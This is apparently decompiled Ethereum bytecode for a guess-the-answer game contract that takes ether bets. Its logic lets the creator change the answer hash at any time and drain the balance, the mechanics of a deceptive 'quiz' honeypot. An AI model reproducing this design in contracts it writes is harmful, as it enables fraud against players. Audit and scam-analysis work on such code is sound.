contract main {


// =======================  Init code  ======================


const _fallback = code.data[30 len 1381]




// =====================  Runtime code  =====================


uint256 stor0;
address stor1;
array of uint256 question;

function question() {
    return question[0 len question.length]
}

function _fallback() payable {
  stop
}

function NewQuestion(string arg1, bytes32 arg2) payable {
    if stor1 == msg.sender:
        question[] = Array(len=arg1.length, data=arg1[all])
        stor0 = arg2
}

function StopGame() payable {
    if stor1 == msg.sender:
        call msg.sender with:
           value eth.balance(this.address) wei
             gas 2300 * is_zero(value) wei
        require ext_call.success
}

function Guess(string arg1) payable {
    mem[128 len arg1.length] = arg1[all]
    mem[ceil32(arg1.length) + 128 len floor32(arg1.length)] = call.data[arg1 + 36 len floor32(arg1.length)]
    mem[ceil32(arg1.length) + floor32(arg1.length) + -(arg1.length % 32) + 160 len arg1.length % 32] = mem[-(arg1.length % 32) + floor32(arg1.length) + 160 len arg1.length % 32]
    if stor0 == sha3(call.data[arg1 + 36 len floor32(arg1.length)], mem[ceil32(arg1.length) + floor32(arg1.length) + 128 len arg1.length % 32]):
        if msg.value > 10^18:
            call msg.sender with:
               value eth.balance(this.address) wei
                 gas 2300 * is_zero(value) wei
            require ext_call.success
}

function StartGame(string arg1, string arg2) payable {
    mem[ceil32(arg1.length) + 160 len arg2.length] = arg2[all]
    if not stor0:
        mem[ceil32(arg1.length) + ceil32(arg2.length) + 160 len floor32(arg2.length)] = call.data[arg2 + 36 len floor32(arg2.length)]
        mem[ceil32(arg1.length) + ceil32(arg2.length) + floor32(arg2.length) + -(arg2.length % 32) + 192 len arg2.length % 32] = mem[ceil32(arg1.length) + floor32(arg2.length) + -(arg2.length % 32) + 192 len arg2.length % 32]
        stor0 = sha3(call.data[arg2 + 36 len floor32(arg2.length)], mem[ceil32(arg1.length) + ceil32(arg2.length) + floor32(arg2.length) + 160 len arg2.length % 32])
        question[] = Array(len=arg1.length, data=arg1[all])
        stor1 = msg.sender
}



}
